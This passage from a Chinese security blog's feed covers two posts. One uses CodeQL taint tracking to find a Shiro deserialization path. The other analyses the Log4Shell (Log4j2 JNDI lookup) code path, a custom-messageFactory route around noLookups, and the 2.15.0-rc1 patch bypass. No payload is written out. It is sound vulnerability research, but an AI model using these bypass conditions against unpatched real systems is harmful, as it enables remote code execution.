punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"java.io"</span><span class="token punctuation">,</span> <span class="token string">"ObjectInputStream"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"readObject"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyTaintTest</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking2</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>    <span class="token function">MyTaintTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"MyTaintTest"</span><span class="token punctuation">}</span>    override predicate <span class="token function">isSource</span> <span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>FieldAccess fda <span class="token operator">|</span> fda <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess mda <span class="token operator">|</span>             mda <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and             mda<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">DeseializationMethod</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>from MyTaintTest conf<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode sinkwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select sink<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"from $@"</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this user input"</span></code></pre><p>得出的结果实际卡在 AbstractRememberMeManager，说明向上的 source 断了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91764dea/16402412852020.jpg" alt></p><h3 id="优化-Source"><a href="#优化-Source" class="headerlink" title="优化 Source"></a>优化 Source</h3><p>按大佬给的 RemoteFlowSource（至于它本身代表什么稍后再说）作为 source，上面的代码基本不动，只是修改 isSource 判断逻辑</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSource</span> <span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    node <span class="token keyword">instanceof</span> <span class="token class-name">RemoteFlowSource</span><span class="token punctuation">}</span></code></pre><p>可以看到 Path 直接跟到了 SimpleCookie，基本上达到了入口点的位置，中间的变量传递也帮我们识别解决了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91764dea/16402422156249.jpg" alt></p><h4 id="RemoteFlowSource"><a href="#RemoteFlowSource" class="headerlink" title="RemoteFlowSource"></a>RemoteFlowSource</h4><p>代码位于<code>/java/ql/lib/semmle/code/java/dataflow/FlowSources.qll</code>，主要识别各种可用于污染跟踪的流源</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91764dea/16402488817802.jpg" alt></p><p>因为有很多子类，不好确定到底是哪个类型触发的，将输出改为<code>source.getNode().getAQlClass()</code>我们能获取到以下内容，可以知道关键在于<code>ExternalRemoteFlowSource</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91764dea/16402468069276.jpg" alt></p><h4 id="ExternalRemoteFlowSource"><a href="#ExternalRemoteFlowSource" class="headerlink" title="ExternalRemoteFlowSource"></a>ExternalRemoteFlowSource</h4><p>定义很简单，主要是 sourceNode 方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">ExternalRemoteFlowSource</span> <span class="token keyword">extends</span> <span class="token class-name">RemoteFlowSource</span> <span class="token punctuation">{</span>  <span class="token function">ExternalRemoteFlowSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">sourceNode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"remote"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>  override string <span class="token function">getSourceType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> result <span class="token operator">=</span> <span class="token string">"external"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>方法定义于<code>/java/ql/lib/semmle/code/java/dataflow/ExternalFlow.qll#L723</code></p><pre class=" language-java"><code class="language-java">predicate <span class="token function">sourceNode</span><span class="token punctuation">(</span>Node node<span class="token punctuation">,</span> string kind<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>InterpretNode n <span class="token operator">|</span> <span class="token function">isSourceNode</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> kind<span class="token punctuation">)</span> and n<span class="token punctuation">.</span><span class="token function">asNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>这里就不再往下深入跟方法了，我们来看看它所在的 ExternalFlow 的内容，这里的注释很关键也方便理解，由于篇幅的缘故不放上来，自行查阅，我们关注以下内容</p><pre class=" language-plain"><code class="language-plain">The CSV specification has the following columns: - Sources:   `namespace; type; subtypes; name; signature; ext; output; kind` - Sinks:   `namespace; type; subtypes; name; signature; ext; input; kind` - Summaries:   `namespace; type; subtypes; name; signature; ext; input; output; kind`The `kind` column is a tag that can be referenced from QL to determine to which classes the interpreted elements should be added. For example, for sources "remote" indicates a default remote flow source, and for summaries "taint" indicates a default additional taint step and "value" indicates a globally applicable value-preserving step.</code></pre><p>根据上面理解 kind 的作用，大致意思就是对 source 进行解析，并通过 kind 来标记三种类型</p><ul><li>remote : 远程流的 source</li><li>taint : 附加污点进行跟踪</li><li>value : 全局保留值</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> predicate <span class="token function">sourceModelCsv</span><span class="token punctuation">(</span>string row<span class="token punctuation">)</span> <span class="token punctuation">{</span>  row <span class="token operator">=</span>    <span class="token punctuation">[</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">// CookieGet*</span>      <span class="token string">"javax.servlet.http;Cookie;false;getValue;();;ReturnValue;remote"</span><span class="token punctuation">,</span>      <span class="token string">"javax.servlet.http;Cookie;false;getName;();;ReturnValue;remote"</span><span class="token punctuation">,</span>      <span class="token string">"javax.servlet.http;Cookie;false;getComment;();;ReturnValue;remote"</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">]</span><span class="token keyword">private</span> predicate <span class="token function">summaryModelCsv</span><span class="token punctuation">(</span>string row<span class="token punctuation">)</span> <span class="token punctuation">{</span>  row <span class="token operator">=</span>    <span class="token punctuation">[</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">// arg to return</span>      <span class="token string">"java.nio;ByteBuffer;false;wrap;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;encode;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;encode;(ByteBuffer);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;encodeToString;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;wrap;(OutputStream);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;decode;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;decode;(ByteBuffer);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;decode;(String);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;wrap;(InputStream);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"cn.hutool.core.codec;Base64;true;decode;;;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"org.apache.shiro.codec;Base64;false;decode;(String);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">]</span></code></pre><p>由此，关键的点 CodeQL 官方已经帮我们识别主流框架中的数据源，并通过将一些变量传递点设为污染连接起来，省去了很多麻烦，不过同时由于限定于这些内容，对于完全自行开发的代码内容就没有那么有效了（如果有这种项目也是神奇）</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.anquanke.com/post/id/256967" target="_blank" rel="noopener">从Java反序列化漏洞题看CodeQL数据流</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;全世界都在学CodeQL？&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="CodeQL" scheme="https://blog.sari3l.com/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>Log4shell 小记</title>
    <link href="https://blog.sari3l.com/posts/9e42d867/"/>
    <id>https://blog.sari3l.com/posts/9e42d867/</id>
    <published>2021-12-13T17:32:35.000Z</published>
    <updated>2021-12-16T09:50:05.977Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><h2 id="version-lt-2-15-0-rc1"><a href="#version-lt-2-15-0-rc1" class="headerlink" title="version &lt; 2.15.0-rc1"></a>version &lt; 2.15.0-rc1</h2><h3 id="commit-分析"><a href="#commit-分析" class="headerlink" title="commit 分析"></a>commit 分析</h3><p>首先根据这两个commits 基本可以确定最终是通过lookup执行了JNDI攻击</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/272ead80ffed4144b536829a1312aac9.png" alt="272ead80ffed4144b536829a1312aac9"></p><p>LOG4J2-3198中可以发现一丝端倪</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/9f77e65bf41448d9b8394bd5ba3c8775.png" alt="9f77e65bf41448d9b8394bd5ba3c8775"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/0a0bb15def3c40a38a9ff873ade0ae24.png" alt="0a0bb15def3c40a38a9ff873ade0ae24"></p><p>通过这两段diff，基本确认就是在MessagePatternConverter通过触发lookup形成了漏洞</p><p>另外可见官方<code>Lookups</code><a href="https://logging.apache.org/log4j/log4j-2.3/manual/lookups.html#JndiLookup" target="_blank" rel="noopener">文档</a>，这里大概知道怎么构造触发</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/fc3a53e4edf6417db5f0833067a6dba8.png" alt="fc3a53e4edf6417db5f0833067a6dba8"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先经过<code>org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled</code>，在这里isEnabled的作用是比较配置文件中Root设定的最低记录信息等级，确认是否需要记录，等级对应在<code>org.apache.logging.log4j.spi.StandardLevel</code>，数字越大记录越全</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logIfEnabled</span><span class="token punctuation">(</span><span class="token keyword">final</span> String fqcn<span class="token punctuation">,</span> <span class="token keyword">final</span> Level level<span class="token punctuation">,</span> <span class="token keyword">final</span> Marker marker<span class="token punctuation">,</span> <span class="token keyword">final</span> String message<span class="token punctuation">,</span>        <span class="token keyword">final</span> Throwable t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>level<span class="token punctuation">,</span> marker<span class="token punctuation">,</span> message<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">logMessage</span><span class="token punctuation">(</span>fqcn<span class="token punctuation">,</span> level<span class="token punctuation">,</span> marker<span class="token punctuation">,</span> message<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>之后通过默认工厂类构造msg，(这里可能会有隐患，详见：<strong>关于自定义 log4j2.messageFactory</strong> 一节</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> MessageFactory2 <span class="token function">createDefaultMessageFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> MessageFactory result <span class="token operator">=</span> DEFAULT_MESSAGE_FACTORY_CLASS<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">narrow</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">final</span> InstantiationException <span class="token operator">|</span> IllegalAccessException e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>执行到<code>org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable</code>，这里会根据配置解析出的转换器进行数据的格式化并将内容填充到buffer</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> StringBuilder <span class="token function">toSerializable</span><span class="token punctuation">(</span><span class="token keyword">final</span> LogEvent event<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder buffer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> len <span class="token operator">=</span> formatters<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        formatters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>replace <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// creates temporary objects</span>        String str <span class="token operator">=</span> buffer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        str <span class="token operator">=</span> replace<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        buffer<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buffer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当formatter为<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>时，如果<code>noLookups</code>未开启，则会尝试通过<code>replace</code>根据表达式替换信息</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">final</span> LogEvent event<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder toAppendTo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> Message msg <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token keyword">instanceof</span> <span class="token class-name">StringBuilderFormattable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token keyword">boolean</span> doRender <span class="token operator">=</span> textRenderer <span class="token operator">!=</span> null<span class="token punctuation">;</span>        <span class="token keyword">final</span> StringBuilder workingBuilder <span class="token operator">=</span> doRender <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> <span class="token operator">:</span> toAppendTo<span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> offset <span class="token operator">=</span> workingBuilder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token keyword">instanceof</span> <span class="token class-name">MultiFormatStringBuilderFormattable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO can we optimize this?</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>config <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>noLookups<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> offset<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> workingBuilder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>workingBuilder<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token operator">&amp;&amp;</span> workingBuilder<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'{'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">final</span> String value <span class="token operator">=</span> workingBuilder<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> workingBuilder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    workingBuilder<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                    workingBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span><span class="token function">getStrSubstitutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>doRender<span class="token punctuation">)</span> <span class="token punctuation">{</span>            textRenderer<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>workingBuilder<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后实际由<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute</code>进行替换操作<br>由<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable</code>执行lookup表达式</p><p>并通过前缀判断进入到对应协议解析<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/7c2e017a39584e83a011826291233312.png" alt="7c2e017a39584e83a011826291233312"></p><p>后面就是常规JNDI利用，不再赘述（这里还未限制协议头</p><h3 id="自定义-log4j2-messageFactory"><a href="#自定义-log4j2-messageFactory" class="headerlink" title="自定义 log4j2.messageFactory"></a>自定义 log4j2.messageFactory</h3><p>首先msg通过<code>messageFactory.newMessage(message)</code>产生，如果全以默认且仅传入message则默认进入<code>org.apache.logging.log4j.message.ReusableMessageFactory#newMessage(java.lang.CharSequence)</code></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> Message <span class="token function">newMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> String message<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> ReusableSimpleMessage result <span class="token operator">=</span> <span class="token function">getSimple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>如果设定messageFactory为log4j2自有的factory</p><ul><li>FormattedMessageFactory</li><li>LocalizedMessageFactory</li><li>MessageFormatMessageFactory</li><li>ParameterizedMessageFactory</li><li>ParameterizedNoReferenceMessageFactory</li><li>SimpleMessageFactory</li><li>StringFormatterMessageFactory</li></ul><p>则会进入<br><code>org.apache.logging.log4j.message.AbstractMessageFactory#newMessage(java.lang.String)</code></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> Message <span class="token function">newMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> String message<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SimpleMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在记录event时，会通过<code>org.apache.logging.log4j.core.impl.MutableLogEvent#setMessage</code>尝试提取msg信息，这里比较关键</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> Message msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token keyword">instanceof</span> <span class="token class-name">ReusableMessage</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> ReusableMessage reusable <span class="token operator">=</span> <span class="token punctuation">(</span>ReusableMessage<span class="token punctuation">)</span> msg<span class="token punctuation">;</span>        reusable<span class="token punctuation">.</span><span class="token function">formatTo</span><span class="token punctuation">(</span><span class="token function">getMessageTextForWriting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>messageFormat <span class="token operator">=</span> msg<span class="token punctuation">.</span><span class="token function">getFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parameters <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            parameters <span class="token operator">=</span> reusable<span class="token punctuation">.</span><span class="token function">swapParameters</span><span class="token punctuation">(</span>parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>            parameterCount <span class="token operator">=</span> reusable<span class="token punctuation">.</span><span class="token function">getParameterCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> InternalAsyncUtil<span class="token punctuation">.</span><span class="token function">makeMessageImmutable</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Message <span class="token function">makeMessageImmutable</span><span class="token punctuation">(</span><span class="token keyword">final</span> Message msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// if the Message instance is reused, there is no point in freezing its message here</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">canFormatMessageInBackground</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            msg<span class="token punctuation">.</span><span class="token function">getFormattedMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// LOG4J2-763: ask message to makeMessageImmutable parameters</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>以及后面开始执行格式化<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>时注意第二部分，会直接无视lookup是否开启，尝试执行替换</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/03ee5f0b5af94c3e8e5e8a27471fcd56.png" alt="03ee5f0b5af94c3e8e5e8a27471fcd56"></p><p>所以关键点在控制以下两点的返回</p><ol><li>messageFactory.newMessage(message) - 返回非继承 ReusableMessage、StringBuilderFormattable、MultiformatMessage</li><li>msg.getFormattedMessage() - 返回恶意 payload 字符串</li></ol><p>所以如何控制呢，其实很简单</p><ol><li>getLogger时指定工厂类，不是ReusableMessage、MultiformatMessage对应Factory（而开发喜欢自定义的工厂类更具危险</li><li>看情况使用单参、多参构造，控制messageFactory.newMessage(…) 返回</li></ol><p><del>很容易构造相关场景，这里暂不提供</del></p><h2 id="version-2-15-0-rc1"><a href="#version-2-15-0-rc1" class="headerlink" title="version == 2.15.0-rc1"></a>version == 2.15.0-rc1</h2><p>这个版本出现了bypass，也是提供了现实案例：官方的补丁不一定安全</p><h3 id="commit-分析-1"><a href="#commit-分析-1" class="headerlink" title="commit 分析"></a>commit 分析</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/ea42bbc5f05a4cf796789b7e2e8a83af.png" alt="ea42bbc5f05a4cf796789b7e2e8a83af"></p><p>很明显，通过异常报错绕过了一些限制，导致直接不安全的lookup（为什么需要这么绕过呢，因为JndiManager初始化时通过设置allowedProtocols与allowedHosts还有allowedClasses基本限制了ldap(s)的利用</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/9e42d867/b6fa61e593f945e89278b35ed553e256.png" alt="b6fa61e593f945e89278b35ed553e256"></p><p>另外注意到LOG4J2-3198在MessagePatternConverter创建实例时新增了判断，默认是SimpleMessagePatternConverter，如果格式化字符带有{lookup}选项时，则通过FormattedMessagePatternConverter创建</p><p><img 